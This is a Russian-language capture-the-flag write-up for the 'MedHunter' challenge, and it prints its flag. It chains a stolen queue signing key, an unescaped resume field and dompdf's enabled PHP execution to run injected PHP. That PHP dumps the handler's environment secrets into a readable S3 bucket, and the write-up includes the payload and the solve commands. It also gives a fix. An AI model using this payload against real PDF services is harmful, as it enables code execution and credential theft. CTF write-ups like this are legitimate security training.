# МёдХантер: секрет подписи

**Флаг:** `avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}`

Ключ подписи PDF находится в окружении обработчика dompdf. Полученный в предыдущей
части ключ очереди позволяет отправить ему своё задание, а неэкранированное поле
резюме — выполнить PHP и записать окружение в доступный S3-бакет.

## Подписанное задание

Ключ очереди `RENDER_QUEUE_SIGNING_KEY` имеет формат `mhq_v1_<32 hex>`. Он извлекается
из образа backend в [предыдущей части](../medhunter_vip/medhunter_vip_writeup.md).
Обработчик принимает объекты `incoming/<job-key>.json` с полями `key`, `payload` и
`signature`:

```text
payload = base64(JSON резюме)
signature = HMAC-SHA256(queue_key, key + "." + payload)
```

Поле `experience` вставляется в HTML без экранирования. У dompdf включён
`isPhpEnabled`, поэтому `<script type="text/php">` выполняется в процессе обработчика.

Готовый PDF попадает в другой бакет, к которому нет доступа. Вместо записи секрета
в документ PHP вызывает уже доступную функцию `s3_request()` и сохраняет данные в
общий бакет резюме:

```php
<script type="text/php">
$dump = "";
foreach (getenv() as $name => $value) {
    $dump .= $name . "=" . $value . "\n";
}
s3_request("PUT", getenv("STORAGE_ACCESS_KEY"), getenv("STORAGE_SECRET_KEY"),
    "medhunter-resumes-6d6c314a", "loot/dump-<uuid>.txt", $dump, "text/plain");
</script>
```

## Запуск и проверка ключа

Нужны S3-реквизиты из [первой части](../medhunter_invite/medhunter_invite_writeup.md),
ключ очереди и работающий PDF-обработчик:

```bash
STORAGE_ACCESS_KEY='...' STORAGE_SECRET_KEY='...' RENDER_QUEUE_SIGNING_KEY='mhq_v1_...' \
uv run python medhunter_signature/solve_medhunter_signature.py
```

Скрипт формирует задание, загружает его, ждёт объект `loot/dump-<uuid>.txt` и извлекает
`PDF_SIGNING_KEY`. Проверка идёт по четырём парам из [pairs_sorted.txt](pairs_sorted.txt):

```text
HMAC-SHA256(PDF_SIGNING_KEY, document_id) == verification_code
```

Ключ очереди и ключ PDF — разные секреты. Наличие пар HMAC само по себе не раскрывает
ключ PDF; выполнение PHP позволяет получить его напрямую.

Отдельные этапы:

```bash
uv run python medhunter_signature/exploit2.py --out medhunter_signature/exploit2.json
uv run python medhunter_signature/s3.py put medhunter-resumes-6d6c314a \
  'incoming/<job-key>.json' medhunter_signature/exploit2.json
uv run python medhunter_signature/s3.py get medhunter-resumes-6d6c314a 'loot/dump-<uuid>.txt'
uv run python medhunter_signature/solve_medhunter_signature.py --self-test
```

Ключи для этих команд также передаются через окружение. Самотест проверяет построение
задания и HMAC локально.

## Файлы

[solve_medhunter_signature.py](solve_medhunter_signature.py) связывает все этапы,
[exploit2.py](exploit2.py) создаёт задание и проверяет подпись,
[s3.py](s3.py) выполняет операции с Object Storage.

Исправление — отключить PHP в dompdf, экранировать поля резюме и разделить права
загрузки заданий, чтения результатов и доступа к секретам подписи.
